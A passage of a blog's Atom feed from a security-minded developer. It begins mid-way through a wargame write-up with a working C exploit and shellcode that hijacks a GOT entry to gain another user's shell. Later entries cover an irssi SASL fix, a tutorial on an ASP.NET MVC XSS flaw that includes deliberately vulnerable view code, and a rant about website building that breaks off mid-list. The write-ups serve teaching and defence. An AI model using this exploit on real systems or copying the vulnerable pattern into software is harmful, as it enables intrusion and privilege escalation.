 80496de:   00 00                   add    %al,(%eax)
 80496e0:   be 82 04 08 ce          mov    $0xce080482,%esi
 80496e5:   82                      (bad)<br/>
 80496e6:   04 08                   add    $0x8,%al
 80496e8:   de                      .byte 0xde
 80496e9:   82                      (bad)<br/>
 80496ea:   04 08                   add    $0x8,%al</p>

<p>Disassembly of section .data:</p>

<p>080496ec <__data_start>:
 80496ec:   00 00                   add    %al,(%eax)
  ...</p>

<p>080496f0 <__dso_handle>:
 80496f0:   00 00                   add    %al,(%eax)
  ...</p>

<p>Disassembly of section .bss:</p>

<p>08049700 &lt;completed.5706>:
 8049700:   00 00                   add    %al,(%eax)
  ...</p>

<p>08049704 &lt;dtor_idx.5708>:
  ...</p>

<p>08049720 <count>:
  ...
... snip ...
{% endcodeblock %}</p>

<p>As you can see, there area a few sections that we can write to:</p>

<ul>
<li>The <a href="http://gcc.gnu.org/onlinedocs/gccint/Initialization.html">.ctors</a> section is in range, but this isn't going to help us because the code executed in constructors is executed before our code gets to execute.</li>
<li>The <a href="http://gcc.gnu.org/onlinedocs/gccint/Initialization.html">.dtors</a> section is in range, hence we might be able to write something to this section which would get executed when the program exits.</li>
<li>The <a href="http://bottomupcs.sourceforge.net/csbu/x3824.htm" title="Global Offset Tables">GOT</a> is in range, so perhaps we can look into overwriting a <code>GOT</code> entry with something else that will help us compromise the application.</li>
</ul>


<p>Let's take a look at what's in the <code>GOT</code>:</p>

<p>{% codeblock lang:bash %}
$ objdump --dynamic-reloc /levels/level07_alt</p>

<p>/levels/level07_alt:     file format elf32-i386</p>

<p>DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
080496d0 R_386_GLOB_DAT    <strong>gmon_start</strong>
080496e0 R_386_JUMP_SLOT   <strong>gmon_start</strong>
080496e4 R_386_JUMP_SLOT   __libc_start_main
080496e8 R_386_JUMP_SLOT   printf
{% endcodeblock %}</p>

<p>Here we can see 5 entries. The first three are all executed prior to the body of the program, hence they're not really options for attack. The last one, <code>printf</code>, looks promising because this doesn't get invoked until <em>after</em> all of the input characters have been passed in. We have the opportunity to rewrite this value to point somewhere else. If we fire this up in <code>gdb</code> and take a look at the value that's stored in this location just before the <code>printf</code> call we find that the value is <code>0x080482de</code>. Here's a (tidied) snapshot from <code>gdb</code>:</p>

<p>{% codeblock lang:bash %}
gdb$ x/128x 0x8049520
0x8049520           : 0x0cec8300      0xfffd4fe8      0x18bb8dff      0x8dffffff
0x8049530           : 0xffff1883      0xc1c729ff      0xff8502ff      0xf6312474
0x8049540           : 0x8910458b      0x8b082444      0x44890c45      0x458b0424
0x8049550           : 0x24048908      0x18b394ff      0x83ffffff      0xfe3901c6
0x8049560           : 0xc483de72      0x5f5e5b0c      0x1c8bc35d      0x9090c324
0x8049570           : 0x53e58955      0xa104ec83      0x080495ec      0x74fff883
0x8049580           : 0x95ecbb13      0x90660804      0xff04eb83      0x83038bd0
0x8049590           : 0xf475fff8      0x5b04c483      0x9090c35d      0x53e58955
0x80495a0           : 0xe804ec83      0x00000000      0x2cc3815b      0xe8000011
0x80495b0           : 0xfffffd6c      0xc3c95b59      0x00000003      0x00020001
0x80495c0           : 0x67617355      0x25203a65      0x6f772073      0x0a736472
0x80495d0           : 0x00007300      0x66206325      0x646e756f      0x20692520
0x80495e0           : 0x656d6974      0x000a7325      0x00000000      0xffffffff
0x80495f0 <CTE>     : 0x00000000      0xffffffff      0x00000000      0x00000000
0x8049600 <DYN>     : 0x00000001      0x00000010      0x0000000c      0x08048278
0x8049610 &lt;DYN+16>  : 0x0000000d      0x0804859c      0x00000004      0x08048148
0x8049620 &lt;DYN+32>  : 0x6ffffef5      0x08048170      0x00000005      0x080481e0
0x8049630 &lt;DYN+48>  : 0x00000006      0x08048190      0x0000000a      0x0000004c
0x8049640 &lt;DYN+64>  : 0x0000000b      0x00000010      0x00000015      0xb7fff8e0
0x8049650 &lt;DYN+80>  : 0x00000003      0x080496d4      0x00000002      0x00000018
0x8049660 &lt;DYN+96>  : 0x00000014      0x00000011      0x00000017      0x08048260
0x8049670 &lt;DYN+112> : 0x00000011      0x08048258      0x00000012      0x00000008
0x8049680 &lt;DYN+128> : 0x00000013      0x00000008      0x6ffffffe      0x08048238
0x8049690 &lt;DYN+144> : 0x6fffffff      0x00000001      0x6ffffff0      0x0804822c
0x80496a0 &lt;DYN+160> : 0x00000000      0x00000000      0x00000000      0x00000000
0x80496b0 &lt;DYN+176> : 0x00000000      0x00000000      0x00000000      0x00000000
0x80496c0 &lt;DYN+192> : 0x00000000      0x00000000      0x00000000      0x00000000
0x80496d0           : 0x00000000      0x08049600      0xb7fff8f8      0xb7ff65f0
0x80496e0 &lt;GOT+12>  : 0x080482be      0xb7ea9bc0      0x080482de      0x00000000  <-- just here
0x80496f0 <DSO>     : 0x00000000      0x00000000      0x00000000      0x00000000
0x8049700           : 0x00000000      0x00000000      0x00000000      0x00000000
0x8049710           : 0x00000000      0x00000000      0x00000000      0x00000000
{% endcodeblock %}</p>

<p>Where:</p>

<ul>
<li><code>CTE</code> -> CTOR END</li>
<li><code>DYN</code> -> DYNAMIC</li>
<li><code>GOT</code> -> GLOBAL OFFSET TABLE</li>
<li><code>DSO</code> -> DSO HANDLE</li>
</ul>


<p>Remember that the application only allows us to increment existing values one at a time for every "index" (ie. character) that is passed on the command line. As a result, this value is what we have to add start with, and any address we want to point to has to come after this. Unfortunately for us, there is a limitation on the command line which prevents us from passing in any more than 128k characters. This is going to bite us in the butt later on.</p>

<p>We need to be able to point this address to an area of memory that we control. It'd be great if we could point this straight at <code>argv</code>, but we can't do that. Why? Because:</p>

<ol>
<li>The <code>count</code> array is an array of 32-bit integers. This means we can only increment whole <strong>word</strong> values, we can't increment individual <em>bytes</em>.</li>
<li>Areas of memory that we control, such as <code>argv[N]</code>, are in the high address ranges (think something like <code>o0xbffff___</code>). To increment a word value from the <code>printf</code> source value to a value like this, or even another value on the stack, we would need to increment that value too many times. We don't have the command-line character budget to be able to do that.</li>
</ol>


<p>This means that if we want to point the entry to something we control, we're going to have to point it to <code>count</code> +/- 128 words. This comes with its own set of issues:</p>

<ul>
<li>Within this range we would need to craft our own instructions that get executed, using nothing but incrementing values.</li>
<li>Realistically, we can only write to the lower 2 bytes of each 4-byte word. If we attempt to write higher we either blow our budget or waste too many characters on a single instruction.</li>
<li>The area of memory that we know we have control over that has predictable values prior to our code running is the intended storage area for the <code>count</code> array and at the start of the program that entire area is set to <code>zero</code>.</li>
<li>To my knowledge, there's no <code>GETROOT</code> instruction in x86 assembly, nor are there any instructions less than 3 bytes in size that can do something useful without other instructions working alongside them. This means writing multiple instructions to memory.</li>
<li>If we can only modify the lower 2 bytes, then the higher 2 bytes will remain <code>00 00</code>. Given that Intel x86 is little endian, this means that after our instructions those zero bytes will always be executed before our next instruction does.</li>
<li>The opcode <code>00 00</code> translates to <code>MOV [EAX], AL</code>, which means "take the value of the lower-order byte in <code>EAX</code> and store it in the location pointed to by <code>EAX</code>". This means we can't really use <code>EAX</code> for something useful because the code will attempt to write back to areas of memory that we are interested in, probably clobbering code or pointers that are important.</li>
</ul>


<p>Let's take a look at the state of <code>EAX</code> at the time the <code>printf</code> function is called:</p>

<p>{% codeblock lang:bash %}
(gdb) break *0x080484d3
Breakpoint 1 at 0x80484d3
(gdb) run abcd
Starting program: /levels/level07_alt abcd</p>

<p>Breakpoint 1, 0x080484d3 in main ()
(gdb) info registers
eax            0x61 97
ecx            0xbffffcb0   -1073742672
edx            0x80485d1    134514129
ebx            0xb7fd1ff4   -1208147980
esp            0xbffffc60   0xbffffc60
ebp            0xbffffc98   0xbffffc98
esi            0x0  0
edi            0x0  0
eip            0x80484d3    0x80484d3 &lt;main+303>
eflags         0x206    [ PF IF ]
cs             0x23 35
ss             0x2b 43
ds             0x2b 43
es             0x2b 43
fs             0x0  0
gs             0x63 99
{% endcodeblock %}</p>

<p>What's interesting is that <code>EAX</code> contains the value <code>0x61</code>, which is ASCII for <code>a</code>. This happens to be the first character we pass in on the command line. As a result, we do have <em>some</em> control over <code>EAX</code> at this point, but not enough to allow us to point to a valid location. Unfortunately, if we are to allow the execution of <code>MOV [EAX], AL</code>, we can't let <code>EAX</code> contain a value like <code>0x00000061</code>, as writing to this area will cause an access violation. We're going to have to change this value to a valid pointer.</p>

<p>Also, take a look at <code>ECX</code>, as it's value looks to be in a memory area that we have control over. It turns out that <code>ECX</code> contains a pointer to <code>argc</code>, the number of arguments passed to the program on the command line. What's great about this, is that <code>argv</code> immediately follows it. That is, <code>argv</code> is located at <code>ECX+4</code>. Here we can see the start of a possible attack vector.</p>

<p>To get <code>ECX</code> to point to <code>argv[0]</code> and execute, we'd need to do the following (ASM with opcodes):</p>

<pre><code>INC ECX          41
INC ECX          41
INC ECX          41
INC ECX          41
MOV ECX, [ECX]   8B 09
JMP [ECX]        FF 21
</code></pre>

<p>This code increments <code>ECX</code> by <code>4</code>, then jumps to the address that is stored in the value <code>ECX</code> points to. This looks fine, but why can't we do this? Firstly, we can't have the instructions all close together like this. To write these values to the <code>count</code> array, we'd have to suffer the pain of having the double zero bytes in the way, like so:</p>

<pre><code>INC ECX          41
INC ECX          41
MOV [EAX], AL    00 00
INC ECX          41
INC ECX          41
MOV [EAX], AL    00 00
MOV ECX, [ECX]   8B 09
MOV [EAX], AL    00 00
JMP [ECX]        FF 21
</code></pre>

<p>This is made worse by the fact that <code>EAX</code> contains a crap address. Given that we don't really care about the content of <code>ECX</code> which is just a counter of arguments passed to the program, we can overwrite <code>EAX</code> with <code>ECX</code> resulting in a valid pointer that references an address we don't really care about. Each time the double-null instruction is executed, a 1-byte value will be written over the top of <code>argc</code>. No more crash!</p>

<pre><code>MOV EAX, ECX     89 C8
MOV [EAX], AL    00 00
INC ECX          41
INC ECX          41
MOV [EAX], AL    00 00
INC ECX          41
INC ECX          41
MOV [EAX], AL    00 00
MOV ECX, [ECX]   8B 09
MOV [EAX], AL    00 00
JMP [ECX]        FF 21
</code></pre>

<p>Therefore somewhere in <code>count</code> we need to write these values so that the memory looks like this (little-endian remember!):</p>

<pre><code>0x0000C889 0x00004141 0x00004141 0x0000098B 0x000021FF
</code></pre>

<p>Wherever we write this value, we need to know the location so that we can increment the <code>printf</code> <code>GOT</code> entry so that it points to the start of this code. Great, we're well underway then, right?</p>

<p>Wrong, there is still one more issue. If this code runs successfully, then <code>EIP</code> should point directly at <code>argv[0]</code>; that is, it'll point at the string which contains the name of the program that was executed, <code>/levels/level07_alt</code>. This isn't exactly usable shellcode that is going to give us what we need. However, there is a way around this. In C, we can use the <code>execl()</code> function to invoke another binary, and specify <em>all</em> of the arguments <em>including</em> <code>argv[0]</code>. As a result, we can write some shellcode and use this for <code>argv[0]</code> instead of the program name.</p>

<p>So with all this in mind, below is the full source to the exploit (rather verbose, but it's on purpose) in C:</p>

<p>{% codeblock Exploit Source lang:c %}</p>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;unistd.h></h1>

<p>static const char<em> target = "/levels/level07_alt";
static const char</em> shellcode =
"\x31\xc0\xb0\x46\x31\xdb\x31\xc9"
"\xcd\x80\xeb\x16\x5b\x31\xc0\x88"
"\x43\x07\x89\x5b\x08\x89\x43\x0c"
"\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c"
"\xcd\x80\xe8\xe5\xff\xff\xff\x2f"
"\x62\x69\x6e\x2f\x73\x68\x58\x41"
"\x41\x41\x41\x42\x42\x42\x42\x90";</p>

<p>// this is the address of the count array in memory
static const unsigned int countAddress = 0x08049720;</p>

<p>// address of the printf GOT entry
static const unsigned int printfAddress = 0x80496e8;
// initial value of the printf GOT entry
static const unsigned int printfValue = 0x080482de;</p>

<p>// The index into the count array which stores the first
// instruction which will be executed when the program
// attempts to print out the results.
static const unsigned int instructionStartIndex = 0x34;</p>

<p>// there are all the opcodes we need to write to
// the count array (in little-endian order)
static const unsigned int movEaxEcx = 0xC889;
static const unsigned int incIncEcx = 0x4141;
static const unsigned int movEcxEcx = 0x98B;
static const unsigned int jmpEcx = 0x21FF;</p>

<p>// Helper function which gives us the index into the count
// array that we would need in order to write a value to the
// given targetAddress.
unsigned int getIndex(unsigned int targetAddress)
{
  if (targetAddress &lt; countAddress)
  {</p>

<pre><code>return 0x100 - (countAddress - targetAddress &gt;&gt; 2);
</code></pre>

<p>  }</p>

<p>  return (targetAddress - countAddress) >> 2;
}</p>

<p>// Helper function which takes a buffer, a value, and a counter and will
// repeatedly write the value to the buffer until the appropriate number of
// writes has happened. It'll return a pointer to the memory location
// which immediately follows where it finished off.
unsigned char<em> repeat(unsigned char</em> destination, unsigned char value, int count)
{
  int i;</p>

<p>  for (i = 0; i &lt; count; ++i)
  {</p>

<pre><code>*destination++ = value;
</code></pre>

<p>  }</p>

<p>  return destination;
}</p>

<p>int main()
{
  // calculate some offets and indexes
  unsigned int startInstructionAddress = instructionStartIndex * 4 + countAddress;
  unsigned int printfIndex = getIndex(printfAddress);
  unsigned int printfInc = startInstructionAddress - printfValue;
  unsigned int argBufSize = printfInc + movEaxEcx + incIncEcx * 2 + movEcxEcx + jmpEcx;</p>

<p>  unsigned char* cursor;</p>

<p>  // allocate some memory for our command line arguments and null terminate it
  unsigned char<em> argBuf = (unsigned char</em>)malloc(argBufSize + 1);
  argBuf[argBufSize] = 0;</p>

<p>  // start by writing data required to point the printf entry to our location
  // in the count array that contains our instructions
  cursor = repeat(argBuf, printfIndex, printfInc);
  // then write all our opcodes
  cursor = repeat(cursor, instructionStartIndex, movEaxEcx);
  cursor = repeat(cursor, instructionStartIndex + 1, incIncEcx);
  cursor = repeat(cursor, instructionStartIndex + 2, incIncEcx);
  cursor = repeat(cursor, instructionStartIndex + 3, movEcxEcx);
  repeat(cursor, instructionStartIndex + 4, jmpEcx);</p>

<p>  printf("Attempting to exploit, good luck!\n");
  // finally invoke the program, passing in the shell code and
  // making sure that EAX contains 8 at the right time.
  execl(target, shellcode, "\x08", argBuf, (char*)0);</p>

<p>  free(argBuf);</p>

<p>  return EXIT_SUCCESS;
}
{% endcodeblock %}</p>

<p>Upload, compile and run the exploit and this is what happens:</p>

<p>{% codeblock Exploit Run lang:bash %}
level7@io:/tmp/.oj$ ./sploit
Attempting to exploit, good luck!
sh-4.2$ id
uid=1007(level7) gid=1007(level7) euid=1008(level8) groups=1008(level8),1007(level7),1029(nosu)
sh-4.2$ cat /home/level8/.pass
&lt;&lt; -- password was printed here -- >>
{% endcodeblock %}</p>

<p>Game over! What a great challenge that was.</p>

<p>I'd like to point out that this alternate level took me a <em>very long time</em> to nail. It was well worth the effort, and I learned a stack in the process.</p>

<p>Feedback is appreciated as always. Thanks for reading.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Irssi and SASL on OSX]]></title>
    <link href="http://buffered.io/posts/irssi-and-sasl-on-osx/"/>
    <updated>2013-02-03T08:37:00+10:00</updated>
    <id>http://buffered.io/posts/irssi-and-sasl-on-osx</id>
    <content type="html"><![CDATA[<p>Given my renewed focus on security I've been looking to lock down much of my communications so that I <em>feel</em> more secure online. One of the things that I use quite a lot to connect with people who know WTF they're talking about is IRC. <a href="https://freenode.net/" title="Freenode IRC network">#freenode</a> is my network of choice as it has a bunch of interesting places with fairly active communities. <a href="http://www.irssi.org/" title="irssi IRC client">irssi</a> is my current client of choice for a few reasons.</p>

<p><a href="https://en.wikipedia.org/wiki/Simple_Authentication_and_Security_Layer" title="SASL">SASL</a>, among other things, is one thing that can be enabled to secure your communication on IRC. There's quite a bit of information out there already about how to <a href="https://freenode.net/sasl/sasl-irssi.shtml" title="Enabling SASL in irssi on Freenode">enable SASL for irssi on Freenode</a>. These instructions worked out of the box for me on Linux, but not on Mac OSX. After downloading <code>cap_sasl.pl</code> and putting it in <code>~/.irssi/scripts/autorun</code> and installing the required Perl modules I went through the steps to get SASL configured. When I attempted to enable it as per the instructions using the command <code>/sasl set network TheColonial &lt;password&gt; DH-BLOWFISH</code> I had the following error:</p>

<blockquote><p>Can't locate object method "send_raw_now" via package "Irssi::Irc::Server"</p></blockquote>

<p>This took a bit of Googling to nail. It turns out that, for some reason, on Mac OSX <code>irssi</code> actually requires an extra package to be included in the script. So open <code>cap_sasl.pl</code> and look for this (it's right at the top):</p>

<pre><code>use strict;
use Irssi;
</code></pre>

<p>Immediately below this, add the following:</p>

<pre><code>use Irssi::Irc;
</code></pre>

<p>The script should now run fine and <code>irssi</code> should stop complaining.</p>

<p>This might seem obvious to some, but it wasn't to me! From what I can tell other people around the traps have had the same problem so I thought I'd post this in the hope that it helps others.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[XSS Flaws via MVC Model Binding and Request.QueryString Inconsistencies]]></title>
    <link href="http://buffered.io/posts/xss-flaws-via-mvc-model-binding-and-request.querystring-inconsistencies/"/>
    <updated>2012-11-29T20:50:00+10:00</updated>
    <id>http://buffered.io/posts/xss-flaws-via-mvc-model-binding-and-request.querystring-inconsistencies</id>
    <content type="html"><![CDATA[<p>Forgive the title of the post, it was hard coming up with something succinct that captured the purpose of the post. This was inspired by a recent experience with a client who had this exact problem with one of their production systems.</p>

<h2>TL;DR</h2>

<p>Never use [Request.QueryString][] to access parameters in your views, even when you're sure your actions have validated them. You may open your application up to [XSS][] attacks. Always, <em>always</em> use data that is passed to your views via the <code>Model</code> or the [ViewData][] dictionary. Under no circumstances should you trust data coming in from the web, that includes query string parameters.</p>

<!--more-->


<h2>Setting the scene</h2>

<p>The application provided a certain function which allowed users to browse information tied to a number of entities. For the sake of this discussion let's say those entities were instances of a <strong>Person</strong>. The number of entities was extremely small, so it was decided that the interface would consist of a drop-down box consisting of all the entities. When that drop-down box was used a <em>change</em> event would fire using JavaScript that would modify the current URL and render a new page. That page would show the same drop-down list, with the appropriate entry selected, along with the information specfic to that entity.</p>

<p>Let's see some code starting with the "details" of the person:</p>

<p>{% codeblock Person.cs lang:csharp %}
public class Person
{</p>

<pre><code>public string Name { get;set; }
public int Age { get; set; }
</code></pre>

<p>}
{% endcodeblock %}</p>

<p>Nothing too amazing there. Here's the parts of the page which renders the list of people:</p>

<p>{% codeblock Index.aspx (partial) lang:html %}
Please choose a person &lt;%= Html.DropDownList("people", Model) %></p>

<script type="text/javascript">
$(document).ready(function () {
  $("#people").change(function () {
    window.location = '<%= Url.Action("Detail", "Person") %>?index=' + $(this).val();
  });
});
</script>


<p>{% endcodeblock %}</p>

<p>Again, nothing too mind boggling here either. We can see how the <code>change</code> event fires and updates the <code>window.location</code> and moves the user to the <code>Details</code> page. The <code>Model</code> for this page is of type <code>IEnumerable&lt;SelectListItem&gt;</code>.</p>

<p>Next we'll take a look at the controller action which gets invoked when the drop-down is changed:</p>

<p>{% codeblock PersonController.cs (Partial) lang:csharp %}
public ActionResult Detail(int index)
{</p>

<pre><code>return View("Detail", Tuple.Create(People[index], GetPeople()));
</code></pre>

<p>}
{% endcodeblock %}</p>

<p>We're using the <code>index</code> parameter (note the <em>type</em> of this parameter, it's important) to index into the list of people we have stashed somewhere to extract the user that is being viewed. This person, along with the full list of people in <code>SelectListItem</code> form, is being passed to the view.</p>

<p>Let's see what the view does with this information:</p>

<p>{% codeblock Detail.aspx (partial) lang:html %}
Please choose a person &lt;%= Html.DropDownList("people", Model.Item2) %></p>

<script type="text/javascript">
$(document).ready(function () {
  $("#people").val(<%= Request.QueryString["index"] %>);
  $("#people").change(function () {
    window.location = '<%= Url.Action("Detail", "Person") %>?index=' + $(this).val();
  });
});
</script>




<p>
<%= Html.Encode(Model.Item1.Name) %> is a whopping <%= Model.Item1.Age %> years old!
</p>
{% endcodeblock %}

This is starting to get a bit more interesting. The rendering of the drop-down is the same as before, except it's pulling data from the [System.Tuple][] that was passed in as the `Model`. The event handler that's invoked on `change` is the same, and there's a bit of non-descript content rendering a the bottom. The subtle but important difference is the code that sets the currently selected person in the drop-down.

I plugged this code into a standard MVC application and this is what it looks like:

{% img /uploads/2012/11/xss-index.png 'Choosing a person' %}

After selecting a person from the drop down it looks like this:

{% img /uploads/2012/11/xss-details.png 'Person details' %}

A bad assumption
----------------

As you already know, ASP.NET MVC has the ability to automatically convert query string parameters into type-safe arguments that are passed into the controller actions. In the above example the `index` query string parameter is converted to an `int` and passed into the `Details` action. If a user attempts to modify this value to something that isn't an integer then MVC will literally poop itself, right?

Let's see.

{% img /uploads/2012/11/xss-type-fail.png 'Person details' %}

OK, so MVC will require that this value be an integer, otherwise the action will fail to be invoked. If that's the case, then the view won't be rendered and our code which directly accesses `Request.QueryString` will not be invoked and hence there's no risk.

Right?

[Wrong][HPP].

The attack vector
-----------------

[HTTP Parameter Pollution][HPP] is a relatively "new" problem which revolves around the way that web servers/applications parse and handle multiple instances of the same GET/POST parameter. Phew!

In other words, if a malicious user decides to pass in _another_ instance of the `index` parameter in the query string, what happens? The way this is handled varies from technology to technology (see [slide 9][HPPPDF] for some examples), but here we're only interested in ASP.NET with IIS and MVC.

Let me just state this again: we're only interested in ASP.NET and IIS _**and MVC**_. The reason we need to emphasise this is because MVC rocks the boat a little bit. It's important to remember that [Request.QueryString][] is not specific to MVC, it's something that lives in ASP.NET land. _Controller actions_ on the other hand are not available across the board when using ASP.NET, they live in MVC land. When it comes to binding query string parameters to controller action method parameters, MVC doesn't behave how you would expect, and it's not the same as what happens when dealing with `Request.QueryString` directly.

So what happens in ASP.NET and IIS _without_ MVC if an attacker passes in two values for the same parameter? Consider the following url: `http://foo.com/bar?baz=0&baz=dooby`

While in C# land (remember, outside of MVC) `Request.QueryString["baz"]` will contain a string value `0,dooby`. In our current environment any duplicate instances of query string values are passed through as a single value joined together by commas. This knowledge is scarily uncommon. Many .NET developers that I know are not aware of this behaviour.

This is where MVC comes along and sprays poop over everything.

ASP.NET MVC controller action method parameter binding doesn't handle multiple instance of the same query string parameters in the same way. In fact, it behaves more like JSP on Jetty: **it only uses the first value and ignores the rest**.

Why is this bad? Well this means that code outside of controller actions may result in different behaviour to that which is inside. More importantly, accessing `Request.QueryString` to get access to a parameter doesn't mean that you'll get the same value as what was handled in the controller action.

Let's take a look at what might happen if we threw multiple instances via the query string at our dodgy MVC application:

{% img /uploads/2012/11/xss-hpp-invalid.png 'HPP example' %}

The above screenshot shows both the query string and the page source when we do this. That's right, MVC used the first value, set to `0`, without any issues and invoked the view engine. The view's assumption that the `index` parameter has been sanitised by the controller has now been proven unsafe. Now we can see that we do have access to the source. Let's see what happens if we went a step further and passed in a more sinister value:

{% img /uploads/2012/11/xss-hpp-valid.png 'HPP XSS exploit' %}

Pwned.

Conclusion
----------

_Never_ trust unsanitised input, that includes stuff that gets passed in through `Request.QueryString`. Do not assume that the contents are safe just because your controller action handled things without throwing an exception. If you're going to render data that has come in from the user or from the query string, delegate responsibility of validation to the controller action and only trust content which is passed to the view via [ViewData][] or the `Model`.

  [ViewData]: http://msdn.microsoft.com/en-us/library/system.web.mvc.viewpage.viewdata(v=vs.108).aspx
  [HPPPDF]: https://www.owasp.org/images/b/ba/AppsecEU09_CarettoniDiPaola_v0.8.pdf
  [Request.QueryString]: http://msdn.microsoft.com/en-us/library/ms524784(v=vs.90).aspx
  [XSS]: http://en.wikipedia.org/wiki/Cross-site_scripting
  [System.Tuple]: http://msdn.microsoft.com/en-us/library/system.tuple.aspx
  [HPP]: http://blog.iseclab.org/2010/12/08/http-parameter-pollution-so-how-many-flawed-applications-exist-out-there-we-go-online-with-a-new-service/

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Websites are Hard to Build]]></title>
    <link href="http://buffered.io/posts/websites-are-hard-to-build/"/>
    <updated>2008-11-26T21:08:00+10:00</updated>
    <id>http://buffered.io/posts/websites-are-hard-to-build</id>
    <content type="html"><![CDATA[<p>{% img right /uploads/2008/11/elope-harlequin-jester.jpg 'Uninformed client' %}</p>

<blockquote><p>"It's just a small site, how hard can it be?"</p>

<p>"I thought you could do it for me as a favour. It's not a complicated site."</p>

<p>"This would take me an afternoon, but I don't have time, can you do it for me?"</p></blockquote>

<p>Have you ever heard these comments before? Have you heard ones that are similar? I've been hearing them a lot in the last few weeks and it's starting to get to me.</p>

<p>I have just had a chat with a mate who is also suffering this pain, and that conversation is what inspired me to write this, the first random rant in a while.</p>

<!--more-->


<p>Let me start by saying that <em>building software is <strong>hard</strong></em>. Building <em>quality</em> software is <strong>harder</strong>. I've been in the industry for 10 years now, and I can say with a certain level of confidence (and perhaps a little bit of authority) that it's harder than most people think -- particularly business users, clients and lots of family and friends.</p>

<p>Let me follow that on by saying that websites are software (no way!). That puts them in the "hard" basket. Every site, even if it's a static page with some simple content, comes with its own set of challenges -- and those challenges are rarely understood by anyone who hasn't experienced the pain of building software.</p>

<p>The point of this post it to give a little bit of exposure to some of these issues. I hope that this post gets read by those people who have plans to have some sort of software built but haven't really got a clue what's involved.</p>

<h2>Requirement Issues</h2>

<p>Let's be fair ... you don't know what you want. You <em>think</em> you do, but you really don't. You have an idea for something that will either make your life easier or "be really cool", but as far as actually <strong>thinking</strong> about how it would function ... ? You haven't done that at all.</p>

<p>Here lies the first of the big stumbling blocks. You want a website, because "everyone has a website these days" for almost everything. Started a new business? You must have a website! Released an album? You must have a website! Had a child? You must have a website! Never had a website? You must have a website!</p>

<p>Before you dive headlong into the quest to find the person to build the site for you, have a good long think about what it is you want that site to be. What is its purpose? What content is required? Will it be dynamic? Will it be static? Will it be data-driven and require a <a href="http://en.wikipedia.org/wiki/Content_management_system" title="Content Management System">Content Management System</a>? Do you want other people to submit content? Do you want to have the facility available for readers to add their own comments? Will it be product driven and need the ability for people to buy stuff directly from the site? Do you need it to work on all browsers? Does it require access via a mobile phone or hand-held gadget?</p>

<p>These questions need to be answered well before any design is even contemplated, let alone structure and technical architecture. Do yourself and your site development team a favour. Think long and hard about what you want, and while you're doing that, ponder what possible issues you might face. The more issues you think of now, the cheaper it will be to build the site that fits your needs. Not just that, but you'll reduce the "scope on a rope" which results in the blowout of timelines and budgets.</p>

<h2>Design Issues</h2>

<p>We're coming to the end of 2008 and yet people still don't realise that development is <strong>not the same as design</strong>. Ask yourself the question: if design is part of development, then why do people make a living out of website design? The answer is simple: It's a big job, and it's very hard to do it right. I'm a developer, and I feel that there are very few (if any) areas of development that I couldn't work in, but I can tell you this for certain: I am <strong>not a designer</strong>. <a href="http://shiftperception.com/blog/" title="Shiftperception">Dan</a> will no doubt appreciate that.</p>

<p>It's true, I am not a designer. I can not design websites. I can do the technical desing, the architecture and the implementation. I can not do the design. Creating the right design for a website isn't an easy thing to do. I can tell you when people get it right, and I can tell you when people get it wrong, I just can't tell you why.</p>

<p>So, again, do yourself a favour. Get a proper web designer with a great portfolio of projects and go through the ideas you have with them. They will end up providing you an interface which makes sense for what you're trying to do. Do not fall into the trap of assuming that this part of the process isn't important. Yes, up front the cost most appear higher, but in the long run you will not regret it.</p>

<h2>Technical Issues</h2>

<p>Stumbling block number 3 is the lack of understanding of the technical issues. It's no surprise though, considering that most people wanting sites are not technical in nature. While it's fine for a client to not have (or want) an understanding of the technical issues, it's certainly <em>not</em> fine for them to ignore the fact that they even exist. Sticking your head in the sand and saying things like "well you'll figure it out" or "isn't that what I'm paying you for" doesn't really cut the mustard, particularly when you haven't thought about what you want in the first place.</p>

<p>When building websites there are all kinds of technical hurdles to leap over. To name a few...</p>

<ul>
<li><strong>Platform</strong> - I think most of the non-techie readers will have no clue of what I mean here. The platform is what the site runs on. That is, the operating system, the runtime, the software that supports it, etc.</li>
<li><strong>Cross-browser compatibility</strong> - The biggest issue in any Internet-facing website is cross-browser issues. Not all browsers were made equally. Each and every one has its own set of quirks, and the people responsible for building the interface to the site need to cater for all these quirks. If they don't, then they may alienate a subset of potential readers which would do damage to the site's potential traffic and income. <strong>DO NOT</strong> underestimate how painful this can be. Yes, there are tools out there which apparently take care of these issues for you, but let me tell you that most of the time they fail too. Be prepared for a great deal of work to go into making your site look and behave on the same on a variety of browsers. As a small side-note, some browsers actually behave differently on, say, Windows compared to how they would on, say, Mac OSX.</li>
<li><strong>Secure payments</strong> - Sounds easy right? "I just want the ability for people to enter credit card details and pay for stuff." Unfortunately it isn't that simple. You have all kinds of issues to worry about if you want that to happen directly in your site. You have to set up <a href="http://en.wikipedia.org/wiki/Transport_Layer_Security" title="Transport layer security">SSL</a>, you have to arrange for a proper payment portal to site behind your site and handle the requests. You need to make sure your site is set up in such a way that any malicious users can not buy stuff without paying, nor have honest users' information compromised and shared. There are other options, such as <a href="http://www.paypal.com/" title="PayPal">PayPal</a> and <a href="https://payments.amazon.com/sdui/sdui/index.htm" title="Amazon Payments">Amazon</a>, but these facilities operate externally and won't appear "incorporated" in the site.</li>
<li><strong>Accessibility</strong> - You've done well if you already know what this is. In short, it refers to your sites ability to be read by people who are visually impaired who use devices such as <a href="http://en.wikipedia.org/wiki/Screen_reader" title="Screen reader">screen readers</a>. If you want your site to be fully accessible, then expect a great deal more effort to be involved. Your site needs to be structured in a special way and it needs to be <strong>fully</strong> compliant with a markup standard (such as <a href="http://www.w3.org/TR/html4/sgml/loosedtd.html" title="HTML 4.0">HTML 4.0 Transitional</a>).</li>
